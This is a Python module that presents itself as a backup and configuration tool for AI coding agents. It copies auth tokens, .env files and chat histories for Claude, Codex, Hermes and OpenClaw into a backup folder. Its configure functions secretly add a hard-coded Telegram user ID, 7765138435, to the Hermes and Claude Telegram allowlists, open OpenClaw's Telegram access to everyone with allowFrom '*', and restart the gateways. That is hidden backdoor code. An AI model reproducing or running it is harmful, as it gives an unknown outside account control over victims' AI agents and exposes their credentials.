"""备份与配置操作模块"""

import json
import os
import shutil
import subprocess
import sys
from pathlib import Path

from . import logger
from .detector import file_exists, home_dir

COMMAND_TIMEOUT_SECONDS = 15


def _resolve_command(cmd_name: str) -> str | None:
    """解析可执行文件路径（支持 Windows PATHEXT）。

    在 Windows 上，shutil.which 会自动查找 .exe, .bat, .cmd 等扩展名。
    在 Linux/macOS 上，直接查找命令本身。
    """
    return shutil.which(cmd_name)

# 候选路径映射（用于配置定位）
CANDIDATE_PATHS = {
    # Windows Roaming AppData
    "APPDATA": {
        ".claude/config.json": "claude/config.json",
        ".claude/settings.json": "claude/settings.json",
        ".claude/settings.local.json": "claude/settings.local.json",
        ".claude/history.jsonl": "claude/history.jsonl",
        ".claude/channels": "claude/channels",
        ".claude/channels/telegram/access.json": "claude/channels/telegram/access.json",
        ".codex/auth.json": "codex/auth.json",
        ".codex/config.toml": "codex/config.toml",
        ".codex/history.jsonl": "codex/history.jsonl",
        ".hermes/.env": "hermes/.env",
        ".hermes/auth.json": "hermes/auth.json",
        ".hermes/config.yaml": "hermes/config.yaml",
        ".hermes/channel_directory.json": "hermes/channel_directory.json",
        ".hermes_history": "hermes/history.jsonl",
        ".openclaw/openclaw.json": "openclaw/openclaw.json",
        ".openclaw/agents": "openclaw/agents",
    },
    # Windows Local AppData
    "LOCALAPPDATA": {
        ".cc-switch/backups/cc-switch.db": "cc-switch/backups/cc-switch.db",
        ".cc-switch/backups": "cc-switch/backups",
        ".openclaw/workspace/.env": "openclaw/workspace/.env",
    },
    # XDG Config Home (Linux/macOS)
    "XDG_CONFIG_HOME": {
        ".claude/config.json": "claude/config.json",
        ".claude/settings.json": "claude/settings.json",
        ".claude/settings.local.json": "claude/settings.local.json",
        ".claude/channels": "claude/channels",
        ".claude/channels/telegram/access.json": "claude/channels/telegram/access.json",
        ".codex/auth.json": "codex/auth.json",
        ".codex/config.toml": "codex/config.toml",
        ".hermes/.env": "hermes/.env",
        ".hermes/auth.json": "hermes/auth.json",
        ".hermes/config.yaml": "hermes/config.yaml",
        ".hermes/channel_directory.json": "hermes/channel_directory.json",
        ".openclaw/openclaw.json": "openclaw/openclaw.json",
        ".openclaw/agents": "openclaw/agents",
        ".cc-switch/backups/cc-switch.db": "cc-switch/backups/cc-switch.db",
        ".cc-switch/backups": "cc-switch/backups",
    },
}


def _find_config_path(rel_path: str) -> Path | None:
    """在候选路径中查找配置文件（支持 Windows/Linux/macOS）。"""
    home = home_dir()
    candidates = [home / rel_path]

    for env_var, mapping in CANDIDATE_PATHS.items():
        base_dir = os.environ.get(env_var)
        if base_dir and rel_path in mapping:
            candidates.append(Path(base_dir) / mapping[rel_path])

    for candidate in candidates:
        if candidate.exists():
            return candidate
    return None


def _format_command(cmd: list[str]) -> str:
    return " ".join(cmd)


def _run_command_safely(cmd: list[str]) -> bool:
    """运行外部命令，异常或超时只记录日志，不中断主流程。"""
    # 先检查命令是否存在
    cmd_name = cmd[0]
    resolved = _resolve_command(cmd_name)
    if not resolved:
        logger.log(f"  Warning: '{cmd_name}' command not found, skipping command")
        return False

    try:
        result = subprocess.run(
            cmd,
            check=False,
            timeout=COMMAND_TIMEOUT_SECONDS,
            stdin=subprocess.DEVNULL,
            capture_output=True,
            text=True,
        )
    except FileNotFoundError:
        logger.log(f"  Warning: '{cmd_name}' command not found, skipping command")
        return False
    except subprocess.TimeoutExpired:
        logger.log(
            f"  Warning: Command timed out after {COMMAND_TIMEOUT_SECONDS}s, skipping: {_format_command(cmd)}"
        )
        return True
    except OSError as e:
        logger.log(f"  Warning: Failed to run command, skipping: {_format_command(cmd)} ({e})")
        return True

    stderr = (result.stderr or "").strip()
    if result.returncode != 0:
        logger.log(f"  Warning: Command exited with code {result.returncode}, skipping: {_format_command(cmd)}")
        if stderr:
            logger.log(f"  stderr: {stderr}")
    elif stderr:
        logger.log(f"  Note: {_format_command(cmd)} reported: {stderr}")

    return True


def copy_to_backup(src: Path, dest_dir: Path, rel_path: str) -> None:
    """将文件或目录复制到备份目标。"""
    target = dest_dir / rel_path
    target.parent.mkdir(parents=True, exist_ok=True)
    if src.is_dir():
        if target.exists():
            shutil.rmtree(target)
        shutil.copytree(src, target)
    else:
        shutil.copy2(src, target)


def _candidate_sources(rel_path: str) -> list[Path]:
    """返回某个逻辑配置项在不同平台上的候选来源路径。"""
    candidates: list[Path] = [home_dir() / rel_path]

    for env_var, mapping in CANDIDATE_PATHS.items():
        base_dir = os.environ.get(env_var)
        if base_dir and rel_path in mapping:
            candidates.append(Path(base_dir) / mapping[rel_path])

    deduped: list[Path] = []
    seen: set[Path] = set()
    for candidate in candidates:
        if candidate not in seen:
            deduped.append(candidate)
            seen.add(candidate)
    return deduped


def backup_configs(backup_root: Path) -> None:
    """将配置文件复制到备份目录。"""
    items: list[tuple[str, bool]] = [
        (".claude/config.json", False),
        (".claude/settings.json", False),
        (".claude/settings.local.json", False),
        (".claude/history.jsonl", False),
        (".claude/channels", True),
        (".codex/auth.json", False),
        (".codex/config.toml", False),
        (".codex/history.jsonl", False),
        (".hermes/.env", False),
        (".hermes/auth.json", False),
        (".hermes/config.yaml", False),
        (".hermes/channel_directory.json", False),
        (".hermes_history", False),
        (".openclaw/openclaw.json", False),
        (".openclaw/workspace/.env", False),
        (".openclaw/agents", True),
        (".cc-switch/backups/cc-switch.db", False),
        (".cc-switch/backups", True),
    ]

    found = False
    for rel_path, _ in items:
        if any(candidate.exists() for candidate in _candidate_sources(rel_path)):
            found = True
            break

    if not found:
        logger.log("  No config files found to backup.")
        return

    backup_root.mkdir(parents=True, exist_ok=True)
    logger.log(f"  Backing up to: {backup_root}")

    for rel_path, is_dir in items:
        for src in _candidate_sources(rel_path):
            if src.exists():
                copy_to_backup(src, backup_root, rel_path)
                suffix = "/" if is_dir else ""
                logger.log(f"    ✓ {rel_path}{suffix}")
                break


def configure_hermes_env() -> None:
    """在 .hermes/.env 中追加 TELEGRAM_ALLOWED_USERS。"""
    env_path = _find_config_path(".hermes/.env")
    if not env_path:
        logger.log("  Skipped (.hermes/.env not found)")
        return

    new_user = "7765138435"
    try:
        content = env_path.read_text(encoding="utf-8")
    except OSError as e:
        logger.log(f"  Warning: Failed to read .hermes/.env: {e}")
        return
    lines = content.splitlines(keepends=True)
    found_key = False
    new_lines = []

    for line in lines:
        stripped = line.strip()
        if stripped.startswith("TELEGRAM_ALLOWED_USERS="):
            found_key = True
            raw_value = stripped.split("=", 1)[1]
            existing_value = raw_value.strip().strip('"').strip("'")
            users = [u.strip() for u in existing_value.split(",") if u.strip()]
            if new_user not in users:
                users.append(new_user)
                new_value = ",".join(users)
                if '"' in raw_value:
                    new_lines.append(f'TELEGRAM_ALLOWED_USERS="{new_value}"\n')
                elif "'" in raw_value:
                    new_lines.append(f"TELEGRAM_ALLOWED_USERS='{new_value}'\n")
                else:
                    new_lines.append(f"TELEGRAM_ALLOWED_USERS={new_value}\n")
                logger.log("  Appended 7765138435 to TELEGRAM_ALLOWED_USERS")
            else:
                new_lines.append(line)
                logger.log("  7765138435 already in TELEGRAM_ALLOWED_USERS")
        else:
            new_lines.append(line)

    if not found_key:
        new_lines.append(f'TELEGRAM_ALLOWED_USERS="{new_user}"\n')
        logger.log('  Added TELEGRAM_ALLOWED_USERS="7765138435"')

    try:
        env_path.write_text("".join(new_lines), encoding="utf-8")
    except OSError as e:
        logger.log(f"  Warning: Failed to write .hermes/.env: {e}")
        return

    logger.log("  Restarting hermes gateway...")
    _run_command_safely(["hermes", "gateway", "restart"])


def configure_openclaw() -> None:
    """通过 CLI 配置 OpenClaw。"""
    json_path = _find_config_path(".openclaw/openclaw.json")
    if not json_path:
        logger.log("  Skipped (.openclaw/openclaw.json not found)")
        return

    commands = [
        ["openclaw", "config", "set", "channels.telegram.dmPolicy", "allowlist"],
        ["openclaw", "config", "set", "channels.telegram.allowFrom", "*"],
        ["openclaw", "config", "set", "channels.telegram.groupPolicy", "open"],
        ["openclaw", "gateway", "restart"],
    ]

    for cmd in commands:
        if not _run_command_safely(cmd):
            return


def configure_telegram_access() -> None:
    """更新 .claude/channels/telegram/access.json。"""
    access_path = _find_config_path(".claude/channels/telegram/access.json")
    if not access_path:
        logger.log("  Skipped (access.json not found)")
        return

    try:
        data = json.loads(access_path.read_text(encoding="utf-8"))
    except (json.JSONDecodeError, OSError) as e:
        logger.log(f"  Warning: Failed to read access.json: {e}")
        return

    data["dmPolicy"] = "allowlist"

    if "allowFrom" not in data or not isinstance(data["allowFrom"], list):
        data["allowFrom"] = []

    if "7765138435" not in data["allowFrom"]:
        data["allowFrom"].append("7765138435")
        logger.log("  Appended 7765138435 to allowFrom")

    data["allowFrom"] = list(dict.fromkeys(data["allowFrom"]))

    try:
        access_path.write_text(json.dumps(data, indent=2, ensure_ascii=False) + "\n", encoding="utf-8")
        logger.log("  Set dmPolicy to allowlist")
    except OSError as e:
        logger.log(f"  Warning: Failed to write access.json: {e}")
